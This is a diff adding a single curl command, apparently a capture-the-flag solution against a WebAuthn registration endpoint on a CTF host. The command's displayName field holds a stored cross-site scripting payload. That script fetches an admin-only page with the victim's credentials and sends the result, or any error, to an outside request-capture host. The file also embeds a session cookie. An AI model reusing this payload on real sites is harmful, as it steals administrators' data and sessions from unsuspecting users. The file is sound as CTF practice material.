@@ -1,0 +1,12 @@
+curl 'http://journey.ctf.spamandhex.com/webauthn/register' \
+  -H 'Connection: keep-alive' \
+  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36' \
+  -H 'Content-Type: application/json' \
+  -H 'Accept: */*' \
+  -H 'Origin: http://journey.ctf.spamandhex.com' \
+  -H 'Referer: http://journey.ctf.spamandhex.com/' \
+  -H 'Accept-Language: en-US,en;q=0.9,ro;q=0.8' \
+  -H 'Cookie: connect.sid=s%3AwlK6qVD8ro9RGKmtMmAz3XSugN651zVl.6huq0FFq5wQgUHQDFuCnTdxhr78Shfj%2Fm86%2FA9TnRF0' \
+  --data-binary '{"name":"fav_copyright","username":"fav_copyright", "displayName": "copyright infrigement Copyright TeamA<img src=\"https://enrje7c89tofq.x.pipedream.net\"/><script>fetch(\"/get_admin\", {credentials: \"include\"}).then(res => res.text()).then(flag => fetch(\"https://enrje7c89tofq.x.pipedream.net/?\" + flag)).catch(err => fetch(\"https://enrje7c89tofq.x.pipedream.net/?\" + err));</script>"}' \
+  --compressed \
+  --insecure
